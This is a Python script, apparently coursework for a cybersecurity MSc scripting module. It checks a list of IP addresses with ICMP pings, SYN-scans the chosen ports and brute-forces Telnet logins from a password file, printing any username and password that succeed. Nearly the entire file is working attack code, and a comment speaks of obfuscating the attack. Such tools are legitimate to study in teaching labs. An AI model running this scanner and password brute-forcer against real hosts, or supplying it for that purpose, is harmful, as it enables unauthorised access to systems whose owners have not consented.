# Resources:
# Python - Most elegant way to read lines of file into list https://mkyong.com/python/python-how-to-read-a-file-into-a-list/
# Scapy - usage: https://scapy.readthedocs.io/en/latest/usage.html
# How to Build a Port Scanner in Scapy - Python Penetration Testing [Part 3] https://www.youtube.com/watch?v=4Y-MR-Hec5Y
# Building network tools part 10: https://thepacketgeek.com/scapy/building-network-tools/part-10/
# Scapy: AttributeError: 'NoneType' object has no attribute 'getlayer' https://stackoverflow.com/questions/51105996/scapy-attributeerror-nonetype-object-has-no-attribute-getlayer
# Scapy p.10 Emulating nmap Functions https://thepacketgeek.com/scapy/building-network-tools/part-10/
# CIT - COMP9053_26231 Scripting for Cybersecurity: https://cit.instructure.com/courses/38610
################################################################
# CIT: MSc in Cybersecurity                   ##################
# Boris Figeczky - R00196187                  ##################
# Scripting for Cybersecurity - Assignment 2  ##################
################################################################
#############This file has the TELNET script ###################
################################################################
import os
import socket
import subprocess
from scapy.all import *
import psutil
import netifaces as ni
from paramiko import SSHClient, AutoAddPolicy
import sys
from telnetlib import Telnet

#Current state:
#net_attack.py -t ip_addresses.txt -p 22,23 -u ubuntu -f passwords.txt

#basic function that allows us to access given path with selected file
def get_file(file_name):
    #ip_addresses.txt
    folder_path = "/home/ubuntu/assignment_2/"
    with open(folder_path + file_name) as f:
        content = f.read().splitlines()
        return content

#************************************>>> is reachable<<<***************************************************************

def is_reachable(ip):
    # using sr function to check conectivity - our interest is in answered messages
    ans, unans = sr(IP(dst=ip) / ICMP(), retry=0, timeout=1)
    if ans:
        return True
    else:
        return False

#**********************************>>> select port <<<*********************************************
# here we are validating in case the user select multiple ports
def select_port(port):
    port_t = tuple(map(int, port.split(',')))
    for prt in port_t:
        if prt == 23:
            return prt
        else:
            continue

#************************************>>> bruteforce telnet <<<**********************************************************

def bruteforce_telnet(active_ip_addresses, username, password_list):
  print("Connecting to host via TELNET...")
  passwords = password_list
  for ip in active_ip_addresses:
    for password in passwords:
      server = ip
      username = username
      if password:
          try:
              def enc(s):
                 return s.encode("ascii")
              tel = Telnet(server, 23)
              wait_for = (enc("login:"))
              tel.read_until(wait_for)
              tel.write(enc(username + "\n"))

              wait_for = (enc("Password:"))
              tel.read_until(wait_for)
              tel.write(enc(password + "\n"))
            # wait until the specified banner appears
              banner = tel.read_until(enc("Welcome to"), timeout=1)

              if "Welcome to" in banner.decode("ascii"):
                  print("*************************************"
                        "\nTELNET: "
                        "\nLogged in to host: " + server +
                        "\nUsername: " + username +
                        "\nPassword: " + password +
                        "\n************************************")
                  tel.write(enc("exit\n"))
                  break
              else:
                  continue
          except:
              break


#**********************************>>> Scan ports <<<***********************************************************

def scan_port(active_ip_addresses, port):
    #this function allows us to specify multple ports
    port_t = tuple(map(int, port.split(',')))
    #radnodmising the port helps obfuscate the attack
    #scr_port = random.randint(port)
    for x in active_ip_addresses:
        for i in port_t:
            # here we are defining the packet dst ip and port with a SYN flag
            packet = IP(dst = x)/TCP(dport=i,flags='S')
            # using sr1 function  that is executed every 0.5 to get the response
            response = sr1(packet, timeout=0.5,verbose =0)
            if response is None:
                print("Ip Address: " + str(x)+" Port " + str(i) + " dropped!")
                continue
            elif response.haslayer(TCP) and response.getlayer(TCP).flags==0x12:
                print("Ip Address: " + str(x)+" Port " + str(i) + " is open!")
            sr(IP(dst=x)/TCP(dport=response.sport,flags='R'),timeout=0.5,verbose=0)
    print("Scan is complete!")
#**********************************>>> Get Passwords <<<***********************************************************

#basic function that allows us to access given path with selected file
def get_password_file(password_file):
  #password_file = "passwords.txt"
  folder_path = "/home/ubuntu/assignment_2/"
  with open(folder_path + password_file) as f:
    content = f.read().splitlines()
    return content

def help():
    print(
        "Help - usage of the program : "
        "\n(1) ./net_attack.py <filename> <port> <username> <list>"
        "\n(2)  specify fle with IPs: '-t' "
        "\n(3)  specify port(s): '-p' "
        "\n(4)  specify username: '-p' "
        "\n(5)  specify file with passwords: '-f' "
        "\n(*)  EXAMPLE usage:  net_attack.py -t ip_addresses.txt -p 22,23 -u ubuntu -f passwords.txt "
    )
    exit()

#************************************>>> main <<<*************************************************************************

def main():
    if len(sys.argv) == 9:
        file_option = sys.argv[1]
        file_name = sys.argv[2]
        port_option = sys.argv[3]
        port = sys.argv[4]
        username_option = sys.argv[5]
        username = sys.argv[6]
        password_file_option = sys.argv[7]
        password_file = sys.argv[8]
        ip_list = get_file(file_name)
        password_list = get_password_file(password_file)
    else:
        return help()

    if file_option == "-t" and file_name and port_option == "-p" and port and username_option \
            =="-u" and username and password_file_option == "-f" and password_file:
        print("************************************"
              "\nYou entered the correct parameters!"
              "\n************************************")
    else:
        return help()

    #checking the IP connectivity
    active_ip_addresses = []
    notactive_ip_addresses = []
    for ip in ip_list:
        print("Checking active "+str(ip)+" is active...")
        print(ip)
        if ip:
            ping = is_reachable(ip)
            if ping:
                    active_ip_addresses.append(ip)
            else:
                    notactive_ip_addresses.append(ip)
    if active_ip_addresses:
        print("************************************"
              "\nActive IP: ")
        print(active_ip_addresses)
        print("************************************")
    else:
        print("No Active addresses found")

    #port scan
    if active_ip_addresses and port:
        print(scan_port(active_ip_addresses, port))
    else:
        print("Help")

    #telnet
    if active_ip_addresses and username and password_file:
        # validatio for multiple ports 
        ports = select_port(port)
        if ports == 23:
            return bruteforce_telnet(active_ip_addresses,username, password_list)
        else:
            print("************************************"
                  "\nTELNET scan:"
                  "\nThis program deals with TELNET on port 23"
                  "\nPort " + port + " is/are NOT a TELNET port(s)!"
                  "\n************************************")
    else:
        help()
main()